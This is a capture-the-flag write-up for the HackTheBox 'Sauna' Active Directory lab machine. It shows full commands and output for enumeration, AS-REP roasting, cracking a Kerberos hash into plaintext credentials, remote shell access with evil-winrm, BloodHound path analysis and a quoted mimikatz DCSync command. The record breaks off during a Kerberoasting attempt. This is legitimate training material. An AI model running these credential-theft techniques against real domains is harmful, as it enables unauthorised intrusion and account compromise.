# Sauna

```
root@kali:/home/kali/htb/Sauna# nmap -p- -sC -sV  10.129.1.165 
Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-16 13:22 EDT
Nmap scan report for 10.129.1.165
Host is up (0.030s latency).
Not shown: 65515 filtered ports
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Egotistical Bank :: Home
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2021-03-17 00:24:36Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49677/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49678/tcp open  msrpc         Microsoft Windows RPC
49679/tcp open  msrpc         Microsoft Windows RPC
49698/tcp open  msrpc         Microsoft Windows RPC
49722/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: SAUNA; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 7h00m01s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2021-03-17T00:25:25
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 201.79 seconds
root@kali:/home/kali/htb/Sauna# 
```

I check the website and find nothing. smbmap finds nothing, dig finds nothing. enum4linux finds the domainname:

```
 =========================================== 
|    Getting domain SID for 10.129.1.165    |
 =========================================== 
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 359.
Domain Name: EGOTISTICALBANK
Domain Sid: S-1-5-21-2966785786-3096785034-1186376766
[+] Host is part of a domain (not a workgroup)

```

I also try rpcclinet with a null session, but no access.

ldapsearch:

```
root@kali:/home/kali# ldapsearch -LLL -x -H ldap://10.129.1.165 -b '' -s base '(objectclass=*)'                      
dn:                                                                                                               
domainFunctionality: 7                                                                                             
forestFunctionality: 7                                                                                               
domainControllerFunctionality: 7
rootDomainNamingContext: DC=EGOTISTICAL-BANK,DC=LOCAL
ldapServiceName: EGOTISTICAL-BANK.LOCAL:sauna$@EGOTISTICAL-BANK.LOCAL
isGlobalCatalogReady: TRUE
supportedSASLMechanisms: GSSAPI
supportedSASLMechanisms: GSS-SPNEGO
supportedSASLMechanisms: EXTERNAL
supportedSASLMechanisms: DIGEST-MD5
supportedLDAPVersion: 3
supportedLDAPVersion: 2
[...]
[...]
[...]
subschemaSubentry: CN=Aggregate,CN=Schema,CN=Configuration,DC=EGOTISTICAL-BANK
 ,DC=LOCAL
serverName: CN=SAUNA,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configu
 ration,DC=EGOTISTICAL-BANK,DC=LOCAL
schemaNamingContext: CN=Schema,CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL
namingContexts: DC=EGOTISTICAL-BANK,DC=LOCAL
namingContexts: CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL
namingContexts: CN=Schema,CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL
namingContexts: DC=DomainDnsZones,DC=EGOTISTICAL-BANK,DC=LOCAL
namingContexts: DC=ForestDnsZones,DC=EGOTISTICAL-BANK,DC=LOCAL
isSynchronized: TRUE
highestCommittedUSN: 73835
dsServiceName: CN=NTDS Settings,CN=SAUNA,CN=Servers,CN=Default-First-Site-Name
 ,CN=Sites,CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL
dnsHostName: SAUNA.EGOTISTICAL-BANK.LOCAL
defaultNamingContext: DC=EGOTISTICAL-BANK,DC=LOCAL
currentTime: 20210317031608.0Z
configurationNamingContext: CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL

root@kali:/home/kali# 
```

And we get some more domain info.

It doesn't seem like theres an "easy" way in, so I start collecting information with cewl which collects strings from the website.

`root@kali:/home/kali/htb/Sauna# cewl -d 5 -m 5 -w cewl.txt http://10.129.1.165`

And I look through the website manually.

I go to the "Meet The Team" section and record the names:

```
Fergus Smith
Hugo Bear
Steven Kerb
Shaun Coins
Bowie Taylor
Sophie Driver
```

I revisit my username generator script from [Teacher](https://github.com/matale14/Writeups/blob/main/HTB/Teacher/Teacher.MD)

And get a list of possible usernames.

I run these through getNPUsers.py:

```
root@kali:/home/kali/htb/Sauna# GetNPUsers.py EGOTISTICAL-BANK.LOCAL/ -usersfile usernames.txt -format john -outputfile hashes -dc-ip 10.129.1.165
root@kali:/home/kali/htb/Sauna# cat hashes
$krb5asrep$FSmith@EGOTISTICAL-BANK.LOCAL:28c6c8813f4eaec6162d1c9ab5892cf0$694a9fdee9917083d6e6c004bf3ff8cfea36f0fce082f4d4e07e0a8c3c2e2339151a9b9383d133dab9d4e41ffea3a451c48b183761f2db73ade99d41bba0a0920e9b95e2b6f741304851a57a478795506cc00017f407a3a7f6e88c8974110508545217e2d151c2ee51d2c6d985e02972c07022c517642fcb38d501a24cfb32765efbbda1142410267229f58429afc46e3b651faf36b18258bce42c9ec2d9303755814700d49d4cd8c76ea2ede3793658f7e6e1b61d50af1e353f1687208e5980f826de7549074a2e622119b7ad068c64bed25319145b73d1cebe64092f511330fea4c4a13fe02b5a77abfd29d3d2b15417fd2b42800349371c533ea18cfefebd
```

And I get a hash, well 2. But it's a duplicate.

I run john on it:

```
root@kali:/home/kali/htb/Sauna# john hashes -wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 2 password hashes with 2 different salts (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Thestrokes23     ($krb5asrep$FSmith@EGOTISTICAL-BANK.LOCAL)
Thestrokes23     ($krb5asrep$FSmith@EGOTISTICAL-BANK.LOCAL)
2g 0:00:00:16 DONE (2021-03-16 16:42) 0.1246g/s 656636p/s 1313Kc/s 1313KC/s Thrall..Thehunter22
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

And we got the creds FSmith:Thestrokes23

I then take these creds through smbmap:

```
root@kali:/home/kali/htb/Sauna# smbmap -H 10.129.1.165 -u 'FSmith' -p 'Thestrokes23'
[+] IP: 10.129.1.165:445        Name: 10.129.1.165                                      
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share 
        print$                                                  READ ONLY       Printer Drivers
        RICOH Aficio SP 8300DN PCL 6                            NO ACCESS       We cant print money
        SYSVOL                                                  READ ONLY       Logon server share 
root@kali:/home/kali/htb/Sauna# 
```

And I also try evil-winrm:

```
root@kali:/home/kali/htb/Sauna# evil-winrm -i 10.129.1.165 -u 'FSmith' -p 'Thestrokes23'

Evil-WinRM shell v2.4

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\FSmith\Documents> dir
*Evil-WinRM* PS C:\Users\FSmith\Documents> cd ..
*Evil-WinRM* PS C:\Users\FSmith> dir


    Directory: C:\Users\FSmith


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-r---        1/23/2020  10:01 AM                Desktop
d-r---        1/24/2020  10:40 AM                Documents
d-r---        9/15/2018  12:19 AM                Downloads
d-r---        9/15/2018  12:19 AM                Favorites
d-r---        9/15/2018  12:19 AM                Links
d-r---        9/15/2018  12:19 AM                Music
d-r---        9/15/2018  12:19 AM                Pictures
d-----        9/15/2018  12:19 AM                Saved Games
d-r---        9/15/2018  12:19 AM                Videos


*Evil-WinRM* PS C:\Users\FSmith> 
```

I use `smbmap -H 10.129.1.165 -R -u 'FSmith' -p 'Thestrokes23'` which I learned from the last official writeup to enumerate the shares.

```
root@kali:/home/kali/htb/Sauna/smb# smbmap -H 10.129.1.165 -R -u 'FSmith' -p 'Thestrokes23' 
[+] IP: 10.129.1.165:445        Name: 10.129.1.165                                      
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
        .\IPC$\*
        fr--r--r--                3 Sun Dec 31 19:03:58 1600    InitShutdown
        fr--r--r--                4 Sun Dec 31 19:03:58 1600    lsass
        fr--r--r--                3 Sun Dec 31 19:03:58 1600    ntsvcs
        fr--r--r--                3 Sun Dec 31 19:03:58 1600    scerpc
        fr--r--r--                1 Sun Dec 31 19:03:58 1600    Winsock2\CatalogChangeListener-358-0
        fr--r--r--                3 Sun Dec 31 19:03:58 1600    epmapper
        fr--r--r--                1 Sun Dec 31 19:03:58 1600    Winsock2\CatalogChangeListener-1c0-0
        fr--r--r--                3 Sun Dec 31 19:03:58 1600    LSM_API_service
        fr--r--r--                3 Sun Dec 31 19:03:58 1600    eventlog
        fr--r--r--                1 Sun Dec 31 19:03:58 1600    Winsock2\CatalogChangeListener-268-0
        fr--r--r--                3 Sun Dec 31 19:03:58 1600    atsvc
        fr--r--r--                1 Sun Dec 31 19:03:58 1600    Winsock2\CatalogChangeListener-5c0-0
        fr--r--r--                5 Sun Dec 31 19:03:58 1600    wkssvc
        fr--r--r--                1 Sun Dec 31 19:03:58 1600    Winsock2\CatalogChangeListener-260-0
        fr--r--r--                1 Sun Dec 31 19:03:58 1600    Winsock2\CatalogChangeListener-260-1
        fr--r--r--                3 Sun Dec 31 19:03:58 1600    RpcProxy\49677
        fr--r--r--                3 Sun Dec 31 19:03:58 1600    ac151524c31a26da
        fr--r--r--                3 Sun Dec 31 19:03:58 1600    RpcProxy\593
        fr--r--r--                4 Sun Dec 31 19:03:58 1600    srvsvc
        fr--r--r--                3 Sun Dec 31 19:03:58 1600    spoolss
        fr--r--r--                1 Sun Dec 31 19:03:58 1600    Winsock2\CatalogChangeListener-6fc-0
        fr--r--r--                3 Sun Dec 31 19:03:58 1600    netdfs
        fr--r--r--                1 Sun Dec 31 19:03:58 1600    vgauth-service
        fr--r--r--                1 Sun Dec 31 19:03:58 1600    Winsock2\CatalogChangeListener-250-0
        fr--r--r--                3 Sun Dec 31 19:03:58 1600    ROUTER
        fr--r--r--                3 Sun Dec 31 19:03:58 1600    W32TIME_ALT
        fr--r--r--                1 Sun Dec 31 19:03:58 1600    Winsock2\CatalogChangeListener-c08-0
        fr--r--r--                1 Sun Dec 31 19:03:58 1600    PIPE_EVENTROOT\CIMV2SCM EVENT PROVIDER
        fr--r--r--                1 Sun Dec 31 19:03:58 1600    Winsock2\CatalogChangeListener-be0-0
        fr--r--r--                1 Sun Dec 31 19:03:58 1600    PSHost.132604263125404801.4080.DefaultAppDomain.wsmprovhost
        NETLOGON                                                READ ONLY       Logon server share 
        .\NETLOGON\*
        dr--r--r--                0 Thu Jan 23 00:44:49 2020    .
        dr--r--r--                0 Thu Jan 23 00:44:49 2020    ..
        print$                                                  READ ONLY       Printer Drivers
        .\print$\*
        dr--r--r--                0 Thu Jan 23 00:32:39 2020    .
        dr--r--r--                0 Thu Jan 23 00:32:39 2020    ..
        dr--r--r--                0 Thu Jan 23 00:29:26 2020    color
        dr--r--r--                0 Thu Jan 23 00:32:39 2020    IA64
        dr--r--r--                0 Thu Jan 23 18:10:43 2020    W32X86
        dr--r--r--                0 Thu Jan 23 18:10:42 2020    x64
        .\print$\color\*
        dr--r--r--                0 Thu Jan 23 00:29:26 2020    .
        dr--r--r--                0 Thu Jan 23 00:29:26 2020    ..
        fr--r--r--             1058 Thu Jan 23 00:27:41 2020    D50.camp
        fr--r--r--             1079 Thu Jan 23 00:27:41 2020    D65.camp
        fr--r--r--              797 Thu Jan 23 00:27:41 2020    Graphics.gmmp
        fr--r--r--              838 Thu Jan 23 00:27:41 2020    MediaSim.gmmp
        fr--r--r--              786 Thu Jan 23 00:27:41 2020    Photo.gmmp
        fr--r--r--              822 Thu Jan 23 00:27:41 2020    Proofing.gmmp
        fr--r--r--           218103 Thu Jan 23 00:28:53 2020    RSWOP.icm
        fr--r--r--             3144 Thu Jan 23 00:27:41 2020    sRGB Color Space Profile.icm
        fr--r--r--            17155 Thu Jan 23 00:28:53 2020    wscRGB.cdmp
        fr--r--r--             1578 Thu Jan 23 00:27:41 2020    wsRGB.cdmp
        .\print$\W32X86\*
        dr--r--r--                0 Thu Jan 23 18:10:43 2020    .
        dr--r--r--                0 Thu Jan 23 18:10:43 2020    ..
        dr--r--r--                0 Thu Jan 23 18:10:43 2020    3
        dr--r--r--                0 Thu Jan 23 18:10:46 2020    PCC
        .\print$\W32X86\3\*
        dr--r--r--                0 Thu Jan 23 18:10:43 2020    .
        dr--r--r--                0 Thu Jan 23 18:10:43 2020    ..
        fr--r--r--          1035776 Thu Jan 23 18:10:43 2020    mxdwdrv.dll
        fr--r--r--          2865152 Thu Jan 23 18:10:43 2020    PrintConfig.dll
        fr--r--r--               53 Thu Jan 23 00:32:41 2020    unishare-pipelineconfig.xml
        fr--r--r--             3360 Thu Jan 23 00:32:41 2020    unishare.gpd
        .\print$\W32X86\PCC\*
        dr--r--r--                0 Thu Jan 23 18:10:46 2020    .
        dr--r--r--                0 Thu Jan 23 18:10:46 2020    ..
        fr--r--r--          3697492 Thu Jan 23 18:10:46 2020    ntprint.inf_x86_9543832f82bb474f.cab
        fr--r--r--          1089648 Thu Jan 23 18:10:44 2020    prnms003.inf_x86_e5fa944b0ac46f93.cab
        .\print$\x64\*
        dr--r--r--                0 Thu Jan 23 18:10:42 2020    .
        dr--r--r--                0 Thu Jan 23 18:10:42 2020    ..
        dr--r--r--                0 Thu Jan 23 18:10:43 2020    3
        dr--r--r--                0 Thu Jan 23 18:10:45 2020    PCC
        dr--r--r--                0 Thu Jan 23 18:10:43 2020    {8AB4F307-6E14-4E91-A0D2-6CD0FAC37F42}
        .\print$\x64\3\*
        dr--r--r--                0 Thu Jan 23 18:10:43 2020    .
        dr--r--r--                0 Thu Jan 23 18:10:43 2020    ..
        dr--r--r--                0 Thu Jan 23 00:29:26 2020    en-US
        fr--r--r--            14088 Thu Jan 23 00:32:42 2020    LOCALE.GPD
        fr--r--r--            78336 Thu Jan 23 09:54:38 2020    mfricr64.dll
        fr--r--r--               73 Thu Jan 23 00:32:42 2020    MSXPSINC.GPD
        fr--r--r--               72 Thu Jan 23 00:32:42 2020    MSXPSINC.PPD
        fr--r--r--           869888 Thu Jan 23 18:10:43 2020    MXDWDRV.DLL
        fr--r--r--            25489 Thu Jan 23 00:32:42 2020    P6DISP.GPD
        fr--r--r--             3293 Thu Jan 23 00:32:42 2020    P6FONT.GPD
        fr--r--r--           288256 Thu Jan 23 00:32:42 2020    PCL4RES.DLL
        fr--r--r--          1025536 Thu Jan 23 00:32:42 2020    PCL5ERES.DLL
        fr--r--r--          1025024 Thu Jan 23 00:32:42 2020    PCL5URES.DLL
        fr--r--r--           204288 Thu Jan 23 00:32:43 2020    PCLXL.DLL
        fr--r--r--            10375 Thu Jan 23 00:32:43 2020    PCLXL.GPD
        fr--r--r--             1156 Thu Jan 23 00:32:43 2020    PJL.GPD
        fr--r--r--            23040 Thu Jan 23 18:10:39 2020    PJLMON.DLL
        fr--r--r--          3535360 Thu Jan 23 18:10:43 2020    PrintConfig.dll
        fr--r--r--          1122304 Thu Jan 23 18:10:39 2020    PS5UI.DLL
        fr--r--r--            26038 Thu Jan 23 00:32:43 2020    PSCRIPT.HLP
        fr--r--r--          1062732 Thu Jan 23 00:32:43 2020    PSCRIPT.NTF
        fr--r--r--           642560 Thu Jan 23 18:10:39 2020    PSCRIPT5.DLL
        fr--r--r--          1293180 Thu Jan 23 00:32:43 2020    PSCRPTFE.NTF
        fr--r--r--             5561 Thu Jan 23 00:32:43 2020    PS_SCHM.GDL
        fr--r--r--          1836032 Thu Jan 23 09:54:38 2020    RD058d64.dll
        fr--r--r--           337920 Thu Jan 23 09:54:38 2020    rica58cb.dll
        fr--r--r--          5185536 Thu Jan 23 09:54:38 2020    rica58cd.dll
        fr--r--r--            31809 Thu Jan 23 09:54:37 2020    rica58cd.psz
        fr--r--r--           939365 Thu Jan 23 09:54:38 2020    rica58cf.cfz
        fr--r--r--           196356 Thu Jan 23 09:54:37 2020    rica58ch.chm
        fr--r--r--          1680384 Thu Jan 23 09:54:38 2020    rica58ci.dll
        fr--r--r--           297472 Thu Jan 23 09:54:40 2020    rica58cj.dll
        fr--r--r--              534 Thu Jan 23 09:54:38 2020    rica58cl.ini
        fr--r--r--            55808 Thu Jan 23 09:54:38 2020    rica58ct.dll
        fr--r--r--          7550202 Thu Jan 23 09:54:38 2020    rica58cz.dlz
        fr--r--r--          2844160 Thu Jan 23 09:54:40 2020    rica58gr.dll
        fr--r--r--          5273600 Thu Jan 23 09:54:38 2020    rica58ug.dll
        fr--r--r--            15026 Thu Jan 23 09:54:38 2020    rica58ug.miz
        fr--r--r--          3177984 Thu Jan 23 09:54:38 2020    rica58ui.dll
        fr--r--r--             1251 Thu Jan 23 09:54:37 2020    rica58ui.irj
        fr--r--r--               69 Thu Jan 23 09:54:37 2020    rica58ui.rcf
        fr--r--r--              202 Thu Jan 23 09:54:37 2020    rica58ui.rdj
        fr--r--r--             4608 Thu Jan 23 09:54:38 2020    rica58ur.dll
        fr--r--r--            51712 Thu Jan 23 09:54:38 2020    ricdb64.dll
        fr--r--r--            23812 Thu Jan 23 00:32:43 2020    STDDTYPE.GDL
        fr--r--r--            14362 Thu Jan 23 00:32:43 2020    STDNAMES.GPD
        fr--r--r--            59116 Thu Jan 23 00:32:43 2020    STDSCHEM.GDL
        fr--r--r--             2278 Thu Jan 23 00:32:43 2020    STDSCHMX.GDL
        fr--r--r--              698 Thu Jan 23 00:32:43 2020    TTFSUB.GPD
        fr--r--r--           526336 Thu Jan 23 18:10:39 2020    UNIDRV.DLL
        fr--r--r--            21225 Thu Jan 23 00:32:43 2020    UNIDRV.HLP
        fr--r--r--          1168896 Thu Jan 23 18:10:39 2020    UNIDRVUI.DLL
        fr--r--r--           855040 Thu Jan 23 18:10:39 2020    UNIRES.DLL
        fr--r--r--               53 Thu Jan 23 00:32:40 2020    unishare-pipelineconfig.xml
        fr--r--r--             3360 Thu Jan 23 00:32:40 2020    unishare.gpd
        .\print$\x64\3\en-US\*
        dr--r--r--                0 Thu Jan 23 00:29:26 2020    .
        dr--r--r--                0 Thu Jan 23 00:29:26 2020    ..
        fr--r--r--             4608 Thu Jan 23 00:28:53 2020    tsprint.dll.mui
        .\print$\x64\PCC\*
        dr--r--r--                0 Thu Jan 23 18:10:45 2020    .
        dr--r--r--                0 Thu Jan 23 18:10:45 2020    ..
        fr--r--r--          3844411 Thu Jan 23 18:10:45 2020    ntprint.inf_amd64_9543832f82bb474f.cab
        fr--r--r--         14808051 Thu Jan 23 09:54:42 2020    oemsetup.inf_amd64_8d99dd951229a6eb.cab
        fr--r--r--            12465 Thu Jan 23 00:32:44 2020    prnms001.inf_amd64_f340cb58fcd23202.cab
        fr--r--r--          1292340 Thu Jan 23 18:10:43 2020    prnms003.inf_amd64_a337db27fa50b915.cab
        fr--r--r--            12645 Thu Jan 23 00:32:43 2020    prnms009.inf_amd64_80184dcbef6775bc.cab
        .\print$\x64\{8AB4F307-6E14-4E91-A0D2-6CD0FAC37F42}\*
        dr--r--r--                0 Thu Jan 23 18:10:43 2020    .
        dr--r--r--                0 Thu Jan 23 18:10:43 2020    ..
        fr--r--r--          3535360 Thu Jan 23 18:10:42 2020    PrintConfig.dll
        RICOH Aficio SP 8300DN PCL 6                            NO ACCESS       We cant print money
        SYSVOL                                                  READ ONLY       Logon server share 
        .\SYSVOL\*
        dr--r--r--                0 Thu Jan 23 00:44:49 2020    .
        dr--r--r--                0 Thu Jan 23 00:44:49 2020    ..
        dr--r--r--                0 Thu Jan 23 00:44:49 2020    EGOTISTICAL-BANK.LOCAL
        .\SYSVOL\EGOTISTICAL-BANK.LOCAL\*
        dr--r--r--                0 Thu Jan 23 00:51:08 2020    .
        dr--r--r--                0 Thu Jan 23 00:51:08 2020    ..
        dr--r--r--                0 Tue Mar 16 06:10:15 2021    DfsrPrivate
        dr--r--r--                0 Sat Jan 25 15:48:44 2020    Policies
        dr--r--r--                0 Thu Jan 23 00:44:49 2020    scripts
        .\SYSVOL\EGOTISTICAL-BANK.LOCAL\Policies\*
        dr--r--r--                0 Sat Jan 25 15:48:44 2020    .
        dr--r--r--                0 Sat Jan 25 15:48:44 2020    ..
        dr--r--r--                0 Sat Jan 25 15:48:44 2020    {2619FB25-7519-4AEA-9C1E-348725EF2858}
        dr--r--r--                0 Thu Jan 23 00:44:49 2020    {31B2F340-016D-11D2-945F-00C04FB984F9}
        dr--r--r--                0 Thu Jan 23 00:44:49 2020    {6AC1786C-016F-11D2-945F-00C04fB984F9}
        .\SYSVOL\EGOTISTICAL-BANK.LOCAL\Policies\{2619FB25-7519-4AEA-9C1E-348725EF2858}\*
        dr--r--r--                0 Sat Jan 25 15:48:44 2020    .
        dr--r--r--                0 Sat Jan 25 15:48:44 2020    ..
        fr--r--r--               59 Sat Jan 25 15:48:44 2020    GPT.INI
        dr--r--r--                0 Sat Jan 25 15:49:11 2020    Machine
        dr--r--r--                0 Sat Jan 25 15:48:44 2020    User
        .\SYSVOL\EGOTISTICAL-BANK.LOCAL\Policies\{2619FB25-7519-4AEA-9C1E-348725EF2858}\Machine\*
        dr--r--r--                0 Sat Jan 25 15:49:11 2020    .
        dr--r--r--                0 Sat Jan 25 15:49:11 2020    ..
        dr--r--r--                0 Sat Jan 25 15:49:11 2020    Microsoft
        dr--r--r--                0 Sat Jan 25 15:49:04 2020    Scripts
        .\SYSVOL\EGOTISTICAL-BANK.LOCAL\Policies\{2619FB25-7519-4AEA-9C1E-348725EF2858}\Machine\Microsoft\*
        dr--r--r--                0 Sat Jan 25 15:49:11 2020    .
        dr--r--r--                0 Sat Jan 25 15:49:11 2020    ..
        dr--r--r--                0 Sat Jan 25 15:49:11 2020    Windows NT
        .\SYSVOL\EGOTISTICAL-BANK.LOCAL\Policies\{2619FB25-7519-4AEA-9C1E-348725EF2858}\Machine\Scripts\*
        dr--r--r--                0 Sat Jan 25 15:49:04 2020    .
        dr--r--r--                0 Sat Jan 25 15:49:04 2020    ..
        dr--r--r--                0 Sat Jan 25 15:49:04 2020    Shutdown
        dr--r--r--                0 Sat Jan 25 15:49:04 2020    Startup
        .\SYSVOL\EGOTISTICAL-BANK.LOCAL\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\*
        dr--r--r--                0 Thu Jan 23 00:44:49 2020    .
        dr--r--r--                0 Thu Jan 23 00:44:49 2020    ..
        fr--r--r--               22 Thu Jan 23 00:51:29 2020    GPT.INI
        dr--r--r--                0 Thu Jan 23 00:51:29 2020    MACHINE
        dr--r--r--                0 Thu Jan 23 00:44:49 2020    USER
        .\SYSVOL\EGOTISTICAL-BANK.LOCAL\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\*
        dr--r--r--                0 Thu Jan 23 00:51:29 2020    .
        dr--r--r--                0 Thu Jan 23 00:51:29 2020    ..
        dr--r--r--                0 Thu Jan 23 00:44:49 2020    Microsoft
        fr--r--r--             2806 Thu Jan 23 00:51:29 2020    Registry.pol
        .\SYSVOL\EGOTISTICAL-BANK.LOCAL\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Microsoft\*
        dr--r--r--                0 Thu Jan 23 00:44:49 2020    .
        dr--r--r--                0 Thu Jan 23 00:44:49 2020    ..
        dr--r--r--                0 Thu Jan 23 00:44:49 2020    Windows NT
        .\SYSVOL\EGOTISTICAL-BANK.LOCAL\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\*
        dr--r--r--                0 Thu Jan 23 00:44:49 2020    .
        dr--r--r--                0 Thu Jan 23 00:44:49 2020    ..
        fr--r--r--               22 Thu Jan 23 11:49:29 2020    GPT.INI
        dr--r--r--                0 Thu Jan 23 00:44:49 2020    MACHINE
        dr--r--r--                0 Thu Jan 23 00:44:49 2020    USER
        .\SYSVOL\EGOTISTICAL-BANK.LOCAL\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\*
        dr--r--r--                0 Thu Jan 23 00:44:49 2020    .
        dr--r--r--                0 Thu Jan 23 00:44:49 2020    ..
        dr--r--r--                0 Thu Jan 23 00:44:49 2020    Microsoft
        .\SYSVOL\EGOTISTICAL-BANK.LOCAL\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\Microsoft\*
        dr--r--r--                0 Thu Jan 23 00:44:49 2020    .
        dr--r--r--                0 Thu Jan 23 00:44:49 2020    ..
        dr--r--r--                0 Thu Jan 23 00:44:49 2020    Windows NT
root@kali:/home/kali/htb/Sauna/smb# 
```

I also run ldapdump:

```
root@kali:/home/kali/htb/Sauna/smb# ldapdomaindump -u 'EGOTISTICAL-BANK\FSmith' -p 'Thestrokes23' 10.129.1.165 -o ../ldapdump
[*] Connecting to host...
[*] Binding to host
[+] Bind OK
[*] Starting domain dump
Traceback (most recent call last):
  File "/usr/local/bin/ldapdomaindump", line 3, in <module>
    ldapdomaindump.main()
  File "/usr/local/lib/python2.7/dist-packages/ldapdomaindump/__init__.py", line 944, in main
    dd.domainDump()
  File "/usr/local/lib/python2.7/dist-packages/ldapdomaindump/__init__.py", line 425, in domainDump
    rw.generatePolicyReport(self)
  File "/usr/local/lib/python2.7/dist-packages/ldapdomaindump/__init__.py", line 833, in generatePolicyReport
    grepout = self.generateGrepList(dd.policy, self.policyattributes)
  File "/usr/local/lib/python2.7/dist-packages/ldapdomaindump/__init__.py", line 732, in generateGrepList
    eo.append(self.formatGrepAttribute(entry[attr]) or '')
  File "/usr/local/lib/python2.7/dist-packages/ldapdomaindump/__init__.py", line 721, in formatGrepAttribute
    return '%.1f minutes' % self.nsToMinutes(att.value)
  File "/usr/local/lib/python2.7/dist-packages/ldapdomaindump/__init__.py", line 468, in nsToMinutes
    return abs(length) * .0000001 / 60
TypeError: bad operand type for abs(): 'str'
root@kali:/home/kali/htb/Sauna/smb# cd ..
root@kali:/home/kali/htb/Sauna# ls
cewl.txt  hashes  info.txt  ldapdump  results.txt  smb  user_gen.py  usernames.txt
root@kali:/home/kali/htb/Sauna# cd ldapdump/
root@kali:/home/kali/htb/Sauna/ldapdump# ls
domain_computers.grep  domain_groups.grep  domain_policy.html  domain_users.html
domain_computers.html  domain_groups.html  domain_policy.json  domain_users.json
domain_computers.json  domain_groups.json  domain_users.grep
root@kali:/home/kali/htb/Sauna/ldapdump# 
```

I run rpcdump as well: `root@kali:/home/kali/htb/Sauna# rpcdump.py EGOTISTICAL-BANK/FSmith:Thestrokes23@10.129.1.165 > rpcdump.txt`

I decide to run bloodhound as well. I find the GC by checking the ldapdump from earlier:

```
root@kali:/home/kali/htb/Sauna/ldapdump# grep -r "GC"
domain_computers.json:            "GC/SAUNA.EGOTISTICAL-BANK.LOCAL/EGOTISTICAL-BANK.LOCAL",
root@kali:/home/kali/htb/Sauna/ldapdump# 


root@kali:/home/kali/htb/Sauna/bloodhound# python3 /home/kali/BloodHound.py/bloodhound.py -d egotistical-bank.local -u FSmith -p Thestrokes23 -gc sauna.egotistical-bank.local -c all -ns 10.129.1.165
INFO: Found AD domain: egotistical-bank.local
INFO: Connecting to LDAP server: SAUNA.EGOTISTICAL-BANK.LOCAL
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: SAUNA.EGOTISTICAL-BANK.LOCAL
INFO: Found 6 users
INFO: Connecting to GC LDAP server: sauna.egotistical-bank.local
INFO: Found 51 groups
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: SAUNA.EGOTISTICAL-BANK.LOCAL
INFO: Done in 00M 05S
root@kali:/home/kali/htb/Sauna/bloodhound# ls
computers.json  domains.json  groups.json  users.json
root@kali:/home/kali/htb/Sauna/bloodhound# 
```

I start up bloodhound and throw the json files in there.

I discover that the user HSmith is Kerberoastable. 

And the only attack path I can find is that FSmith can PSRemote into Sauna.egotistical-bank.local.

This is a member of Enterprise domain controllers, who has GetChanges permissions to egotistical-bank.local.

It is also a member of Domain controllers, who have GetChangesAll permissions to egotistical-bank.local.

These two combined we may be able to get the password hash.

```
With both GetChanges and GetChangesAll privileges in BloodHound, you may perform a dcsync attack to get the password hash of an arbitrary principal using mimikatz:

lsadump::dcsync /domain:testlab.local /user:Administrator

You can also perform the more complicated ExtraSids attack to hop domain trusts. For information on this see the blod post by harmj0y in the references tab.
```

I try to get the HSmith password with GetUserSPNs.py but the clock skew is too great:

```
root@kali:/home/kali/htb/Sauna# GetUserSPNs.py egotistical-bank.local/FSmith:Thestrokes23 -dc-ip 10.129.1.165 -request -output hash2
Impacket v0.9.22.dev1+20200819.170651.b5fa089b - Copyright 2020 SecureAuth Corporation

